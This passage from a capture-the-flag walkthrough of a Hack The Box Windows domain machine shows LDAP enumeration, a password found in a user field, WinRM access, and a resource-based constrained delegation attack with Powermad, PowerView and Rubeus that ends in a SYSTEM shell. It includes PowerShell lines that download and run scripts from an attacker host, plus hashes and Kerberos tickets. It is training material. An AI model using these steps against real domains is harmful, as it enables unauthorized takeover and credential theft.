  - Storage Replica Administrators (0 members)
  - Schema Admins (1 members)
    Members:
      CN=Administrator,CN=Users,DC=support,DC=htb
  - Enterprise Admins (1 members)
    Members:
      CN=Administrator,CN=Users,DC=support,DC=htb
  - Domain Admins (1 members)
    Members:
      CN=Administrator,CN=Users,DC=support,DC=htb
  - Server Operators (0 members)
  - Account Operators (0 members)
  - DnsAdmins (0 members)

[+] Enumerating Organizational Units (OUs)...
+--------------------+------------------------------------------+
| OU Name            | Description                              |
+--------------------+------------------------------------------+
| Domain Controllers | Default container for domain controllers |
+--------------------+------------------------------------------+

[+] Checking password policy...
[-] Error retrieving password policy: invalid server address

[+] Checking for unconstrained delegation...
  - Accounts with unconstrained delegation:
    - DC$ (DC)

[+] LDAP Server Info:
  - Server name: DC=support,DC=htb
  - Domain controller: d
  - Forest name: DC=support,DC=htb
```

- The `LDAPHunter`, under the _Uncommon Fields with Values_, we can see an interesting value `Ironside47pleasure40Watchful`, which is looks like it could be a password, related to `support` username.

```bash
[+] Uncommon Fields with Values:
+-------------------+----------------------+----------------------------------------------------+
| Username          | Field                | Value                                              |
+-------------------+----------------------+----------------------------------------------------+
... SNIP ...

| support           | info                 | Ironside47pleasure40Watchful                       |

... SNIP ...
``` 

To verify the found crendials, we can use `crackmapexec` once again:
```bash 
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ crackmapexec smb 10.10.11.174 -u support -p Ironside47pleasure40Watchful
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
```

- Nice, the found credentials works fine !

### Evil-WinRM
Using `evil-winrm` we are going to connect as `support` user into the machine:

```
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ evil-winrm  -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful         
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
```
#### user.txt
```bash
*Evil-WinRM* PS C:\users\support\desktop> cat user.txt; whoami; hostname; ipconfig
e3c5521ed8c3a0c455e269106d863bc3
support\support
dc

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.174
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

### Bloodhound
Since, we have new credentials of the user `support` we can run `Bloodhound` again used these creds:

```bash
┌──(kali㉿kali)-[~/htb/machines/support/bloodhound]
└─$ bloodhound-python -u support -p Ironside47pleasure40Watchful -d support.htb -ns 10.10.11.174 --dns-tcp -c All --zip
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 15S
INFO: Compressing output into 20250422135645_bloodhound.zip
```

- Loading the `20250422135645_bloodhound.zip` into `Bloodhound`, and mark `support` user as owned.
- The `support` user is a member of the Shared Support Accounts group (`SHARED SUPPORT ACCOUNTS@SUPPORT.HTB`), which has GenericAll on the computer object, DC.SUPPORT.HTB:
![wireshark_1](/assets/img/htb/support/bloodhound1.png)

## Local Privilege Escalation
We are going to abuse resource-based constrained delegation. So, we need to upload 2 scripts (`PowerView.ps1` and `Powermad.ps1`) and `Rubeus.exe` to the victim machine:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.13/PowerView.ps1')
*Evil-WinRM* PS C:\Users\support\Documents> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.13/Powermad.ps1')
*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile("http://10.10.14.13/Rubeus.exe","C:\windows\tasks\Rubeus.exe")
```

1. Verify that users have the access to add machines to domain or not:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -Identity "DC=SUPPORT,DC=HTB" | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

- The execute command above results that the quote is set to default `10`.

2. We need to make sure that the DC environment version is 2012+ (here we have `Windows Server 2022 Standard`):

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainController | select name,osversion | fl


Name      : dc.support.htb
OSVersion : Windows Server 2022 Standard
```

3. We also need to check that the `msds-allowedtoactonbehalfofotheridentity` is empty, which it is:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl

name                                     : DC
msds-allowedtoactonbehalfofotheridentity :
```

### Create New Machine & Attack
We'll use `Powermad` script to create a new machine named `0xW43lPC` and the password `0xW43lPC123!`:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount 0xW43lPC -Password $(ConvertTo-SecureString '0xW43lPC123!' -AsPlainText -Force)
```

Also, We need to SID of the computer object:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer 0xW43lPC -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid
S-1-5-21-1677581083-3380853377-188903654-5602
```

Now can start the attack by configuring the DC to trust the new machine (`0xW43lPC`) to make authorization decisions on it's behalf:

```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

It's time to verify if its work or not:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5602
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

### Get the TGT
There is multiple ways here to get the TGT using `Rubeus` or `impacket getST.py`, which we will see them both:

#### Get the TGT using Rubeus
All we need for now is to authenticate as the new fake machine `0xW43lPC`. First, we need the `rc4_hmac` which we can get using `Rubeus`:

```bash
*Evil-WinRM* PS C:\windows\tasks> .\Rubeus.exe hash /password:0xW43lPC123! /user:0xW43lPC /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 0xW43lPC123!
[*] Input username             : 0xW43lPC
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTB0xW43lPC
[*]       rc4_hmac             : D7FAFDB6EA9FAF82DDB0C25E2B491212
[*]       aes128_cts_hmac_sha1 : 339F0C73D60F18EFD798A127A3D00EE6
[*]       aes256_cts_hmac_sha1 : 60BF5227821878D2E78CB763F4C1BD2D23D7E6201E0FC046F81DA6A06B83A42C
[*]       des_cbc_md5          : 40ADCE67E6791649

*Evil-WinRM* PS C:\windows\tasks> 
```

Once, we have the `rc4_hmac` of our machine password, we'll pass it to `Rubeus` again, but now to get a ticket for administrator
```bash
*Evil-WinRM* PS C:\windows\tasks> .\Rubeus.exe s4u /user:0xW43lPC$ /rc4:D7FAFDB6EA9FAF82DDB0C25E2B491212 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: S4U

[*] Using rc4_hmac hash: D7FAFDB6EA9FAF82DDB0C25E2B491212
[*] Building AS-REQ (w/ preauth) for: 'support.htb\0xW43lPC$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFbjCCBWqgAwIBBaEDAgEWooIEhTCCBIFhggR9MIIEeaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBD8wggQ7oAMCARKhAwIBAqKCBC0EggQpJemqAN2w
      ZVKtAmcFfKAo00S6szsIXf3M79lMOh2JVhnZ5ZHJIQtfAd9vGbgdQ1DP2LQ0qJjZJLO+aVULp7gMoVNx
      KCr0/ku1T/HIPInlhd40whUNF13tqLEpwgfyYQ2zaKcx1W5V0oRBAH8UYqcyCSEwnEhIDXyP94mzGJ68
      HVWVl9BrKFyHTJFc0sqbhZJcDBpoIySt6dBUSM03p+Do1Rzgm2tYK49ojJwgiIpYL2zH0VCwZmXcwxnM
      b2NZG7xCrnjmbbcUmbcBoIzHSx4eIvu6A0lb2VZy9nkHxDNX2lK9AG+c5Uar2suMLZNC+x874CFpU6tp
      MXpwIk/EgmaSOCdpjTjTYWkLcNY0qsb0AvwHT78IkboSDSBbWxrky8UquVGk5GqOlzOnenAfcIvQhajD
      v9IIJ+amGFqAIoa8QoNX8b1iT9x/csv/HNaiOztcsCyWNYmdxLescqTQgjp8aKwkIjx5q/A7p+KQeZPC
      NJJHSs0jp2cuv9z4hPqGaBKcshLHBnwSen4eBDBixzfsPAwsljlV6d24d/LpqtzoCUywqtfQzidZNdIu
      o4NUipJswWHBBYW99f+a8ZeAed2PQ8P+QxK9/7ReNCgy2OKXSDth2SvTTDbRrU3NqXja3AaIV7qF+Ovv
      GY/MKFy0SfgzdQPYS+f73ax+KgRCV2c4GJ0IYDuqb+o98qicwyxvAT22qfYd/Hx03brwu9bBC6dLfrti
      XWXvRerLW5jBjpP5aZ6Fr5AclbgudVqWoPU2QVbTfM5n1XUGkne1/VTnH7g9K+j4Fv7Km3J7nnWUVzAE
      dQVYs6TKG2pZLL7zZmFx2KfZWstIymEkSMiuxbrzu0nU2rc/XndgIvysoX3+vpZ+R4QZNf8+UXx+GxSC
      vhLn1auLGP8ET2kfMK6WLjgEPSVYwEuf4e9gp3QkGAnqCyi2wA3oP+QkFY7uMdq6Bf1hgzF6JceanOHF
      1VXdJqEGqhzcfCevQ8GmB6Ed1TrB/eMBi+X3dv1FsiFRXquJuTa+RGG+e9hrqHrSsidmF30jofHa86/y
      Vz6vsNn6fyKDhoZzLD/tavtQKmMfqE8MfS9Ccl36aJ3qALdYUHjf4JaEexTXFZEU7YIXLIcAerCO5K+M
      CnATzixGFB4WNI4HPuV7qJazFi6bsuEV7jzip76KD6e8QOhkV5r+HI3Z5FKZ3bPhBG7KEhcP4BWqGYId
      ix8ae0FVAm93/d6bFfEoG8hH3bknWkTgBjj53dXUCWW+9yPf86kEzG1WJ0pdzhXpcpOuRxR6rFd08/nz
      FRYlfMAiYl4gC5wmXH6wULx8H1jXowV+kLUroMc6gRKtZ3FRtBKvE1Y83zsXDMxPhAf3uwVL3UT26X9E
      EPJSsjKeQkTFisGGXXNidTnjNs2EeGoaNgITFgUoLIDkfFd5VwtKo4HUMIHRoAMCAQCigckEgcZ9gcMw
      gcCggb0wgbowgbegGzAZoAMCARehEgQQr9CighIcPaIDS0zuhqcXK6ENGwtTVVBQT1JULkhUQqIWMBSg
      AwIBAaENMAsbCTB4VzQzbFBDJKMHAwUAQOEAAKURGA8yMDI1MDQyMTIwMDIzMFqmERgPMjAyNTA0MjIw
      NjAyMzBapxEYDzIwMjUwNDI4MjAwMjMwWqgNGwtTVVBQT1JULkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRn
      dBsLc3VwcG9ydC5odGI=


[*] Action: S4U

[*] Using domain controller: dc.support.htb (10.10.11.174)
[*] Building S4U2self request for: '0xW43lPC$@SUPPORT.HTB'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator@SUPPORT.HTB' to '0xW43lPC$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (10.10.11.174)
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      LnN1cHBvcnQuaHRi
[+] Ticket successfully imported!
```

#### Get the TGT using getST.py
Since we have the fake machine name and it's password, all we need is to execute the following command:

```bash
╭─kali@kali ~/htb/machines/support/krb/tt 
╰─$ /usr/share/doc/python3-impacket/examples/getST.py -spn cifs/dc.support.htb support.htb/0xW43lPC\$ -impersonate administrator
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:378: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:475: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:605: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:657: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

- This command results a ticket under the name `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`

### Use The Ticket
#### Ticket from Rubeus
- For the `Rubeus` result, we can grab the last ticket and copy it back to our attacker machine, saving it as ticket.kirbi.b64, making sure to remove all spaces. Then using `base64` decode it into ticket.kirbi.

```bash
┌──(kali㉿kali)-[~/htb/machines/support/tickets]
└─$ base64 -d ticket.kirbi.b64 > ticket.kirbi 
```

- Now, we need to convert it to a format that Impact can use:

```bash
┌──(kali㉿kali)-[~/htb/machines/support/tickets]
└─$ impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done
``` 

#### Ticket from getST.py
Using `getST` we already have `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache` ticket ready to use.
- Export the ticket to export `KRB5CCNAME` as the follow:

```bash
╭─kali@kali ~/htb/machines/support/krb/tt 
╰─$ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```


- Then We can use this to get a shell using `psexec.py`:


```bash
╭─kali@kali ~/htb/machines/support/krb/tt 
╰─$ /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass support.htb/administrator@dc.support.htb -dc-ip 10.10.11.174                                                                          130 ↵
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file oROGuPYt.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service ZRTb on dc.support.htb.....
[*] Starting service ZRTb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd \users
C:\Users> cd Administrator

C:\Users\Administrator> whoami & hostname
nt authority\system
dc

C:\Users\Administrator> 
``` 

### Troubleshooting

- **Kerberos Errors**: Ensured system time synchronization using `ntpdate` to avoid ticket issues.
- **WinRM Failure**: If WinRM failed, `impacket-smbexec` was an alternative.

## Lessons Learned

- **SMB Misconfiguration**: Guest access to `support-tools` exposed critical files.
- **Hardcoded Credentials**: Developers embedding credentials in executables is a common vulnerability.
- **Kerberos Weakness**: Misconfigured permissions allowed ticket-based impersonation.
- **Enumeration**: Thorough service enumeration was key to identifying the attack path.

## Conclusion

The Support machine highlights common Windows vulnerabilities, including SMB share misconfigurations, hardcoded credentials, and Kerberos exploitation. By enumerating services, analyzing executables, and leveraging Kerberos, we achieved initial access and escalated to administrator. This challenge emphasizes secure configuration and credential hygiene in Active Directory environments.